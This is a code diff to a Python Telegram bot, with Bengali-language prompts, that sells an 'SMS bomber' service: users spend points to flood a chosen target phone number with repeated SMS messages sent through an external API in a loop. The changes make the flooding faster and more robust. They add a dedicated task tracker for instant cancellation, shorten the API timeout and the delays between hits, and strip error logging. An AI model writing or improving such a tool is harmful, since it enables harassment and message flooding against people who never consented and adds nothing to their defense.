@@ -205,6 +205,8 @@ def check_vip_status(tg_user):
     return u.get("is_vip", False)
 
 temp_data = {}
+active_bombing_tasks = {} # Dedicated tracker for active bombing sessions (Fixes Cancel Bug)
+
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
@@ -242,6 +244,8 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if not user: return
     u = get_user_data(user)
+    
+    # Safe temp cleanup without destroying active bombing tasks
     if user.id in temp_data: del temp_data[user.id]
     
     is_vip = check_vip_status(user)
@@ -283,7 +287,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not user: return
     u = get_user_data(user)
     
-    # Auto Point Claim from Mini App Deep Link
     if context.args and context.args[0].lower() == 'claim20pts':
         pts = 20
         if users_col is not None:
@@ -299,7 +302,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Referral Check
     if context.args and context.args[0].isdigit():
         ref_id = int(context.args[0])
         if ref_id != user.id and u.get('referred_by') is None:
@@ -318,16 +320,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
-    # Safe Query Answer
-    try: await query.answer()
-    except Exception: pass
-        
     user = query.from_user
     if not user: return
     user_id = user.id
     get_user_data(user)
     
     if query.data == 'check_join':
+        try: await query.answer()
+        except Exception: pass
         unjoined = await get_unjoined_channels(user_id, context)
         if not unjoined:
             try: await query.message.delete()
@@ -337,14 +337,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await send_join_prompt(update, unjoined, is_error=True)
 
-    # 🛑 Strict Instant Cancel Trigger
+    # 🛑 ULTRA FAST INSTANT CANCEL BUTTON HANDLER
     elif query.data.startswith('cancel_bombing_'):
         target_uid = int(query.data.split('_')[2])
         if user_id == target_uid or is_admin(user_id):
+            # Mark active task as cancelled instantly
+            if target_uid in active_bombing_tasks:
+                active_bombing_tasks[target_uid]['cancel'] = True
             if target_uid in temp_data:
                 temp_data[target_uid]['cancel'] = True
-                try: await query.answer("🛑 বোম্বিং সাথে সাথে বাতিল করা হয়েছে!", show_alert=True)
-                except Exception: pass
+                
+            try: await query.answer("🛑 বোম্বিং সাথে সাথে বাতিল করা হয়েছে!", show_alert=True)
+            except Exception: pass
         else:
             try: await query.answer("❌ আপনি এই বোম্বিং বাতিল করতে পারবেন না!", show_alert=True)
             except Exception: pass
@@ -584,7 +588,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ <b>পর্যাপ্ত পয়েন্ট নেই!</b>\n💰 ব্যালেন্স: <b>{u.get('points', 0)} Points</b>\n👉 '💰 EARN POINTS' থেকে ফ্রি পয়েন্ট নিন!", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
             return
 
-        temp_data[user_id] = {'step': 'awaiting_number', 'cancel': False}
+        temp_data[user_id] = {'step': 'awaiting_number'}
         await update.message.reply_text("📱 <b>START BOMBER</b>\n\nদয়া করে টার্গেট নম্বর দিন:\nউদাহরণ: <code>018XXXXXXXX</code>", parse_mode="HTML", reply_markup=get_back_keyboard())
         return
 
@@ -762,7 +766,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ নম্বর সেট: <code>{num}</code>\n\n💥 কত বার (হিট) বোম্বিং করবেন?\n{limit_info}", parse_mode="HTML", reply_markup=get_back_keyboard())
         return
 
-    # ===== BOMBING LOOP WITH ACCURATE SMS COUNT & INSTANT CANCEL =====
+    # ===== BOMBING LOOP WITH FAST CANCEL & EXACT COUNTS =====
     elif step == 'awaiting_amount':
         try:
             amount = int(message)
@@ -784,7 +788,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if users_col is not None:
                     users_col.update_one({"user_id": user_id}, {"$inc": {"points": -total_cost}}, upsert=True)
                 
-            temp_data[user_id]['cancel'] = False
+            # Initialize Active Task State
+            active_bombing_tasks[user_id] = {'cancel': False}
             
             if users_col is not None:
                 users_col.update_one({"user_id": user_id}, {"$set": {"last_bombing": datetime.now()}}, upsert=True)
@@ -803,12 +808,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             for i in range(amount):
                 # 🎯 Pre-Hit Cancel Check
-                if temp_data.get(user_id, {}).get('cancel', False):
+                if active_bombing_tasks.get(user_id, {}).get('cancel', False):
                     break
 
                 try:
-                    # Async non-blocking API call
-                    api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=15)
+                    # 💥 Fast 4-Second Timeout API Call (Prevents Bot Hanging)
+                    api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=4)
                     
                     # 💥 EXACT SMS Counting Logic From bot 3.py
                     if api_response.status_code == 200:
@@ -829,16 +834,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             total_sent_count += 1
                     else:
                         total_failed_count += 1
-                        print(f"HTTP Error: {api_response.status_code}")
 
                 except Exception as e:
                     total_failed_count += 1
-                    print(f"Error occurred during hit {i+1}: {e}")
                 
                 completed_hits += 1
                 
-                # 🎯 Post-Hit Instant Cancel Check & Point Refund
-                if temp_data.get(user_id, {}).get('cancel', False):
+                # 🎯 Post-Hit Cancel Check
+                if active_bombing_tasks.get(user_id, {}).get('cancel', False):
                     break
 
                 percent = int((completed_hits / amount) * 100)
@@ -858,14 +861,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     )
                 except Exception: pass
                 
-                # Interruptible 1 second delay check
-                for _ in range(10):
-                    if temp_data.get(user_id, {}).get('cancel', False):
+                # Interruptible short delays for instant cancel handling
+                for _ in range(5):
+                    if active_bombing_tasks.get(user_id, {}).get('cancel', False):
                         break
                     await asyncio.sleep(0.1)
 
             # 🛑 Handle Cancellation Refund Execution
-            if temp_data.get(user_id, {}).get('cancel', False):
+            is_cancelled = active_bombing_tasks.get(user_id, {}).get('cancel', False)
+            if user_id in active_bombing_tasks:
+                del active_bombing_tasks[user_id]
+
+            if is_cancelled:
                 unexecuted_hits = amount - completed_hits
                 refund_points = 0 if is_vip else unexecuted_hits * POINT_PER_HIT
                 
@@ -959,7 +966,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     
     print("="*50)
-    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH ACCURATE SMS COUNTS & REFUND SYSTEM!")
+    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH INSTANT CANCEL & FAST RESPONSE!")
     print("="*50)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
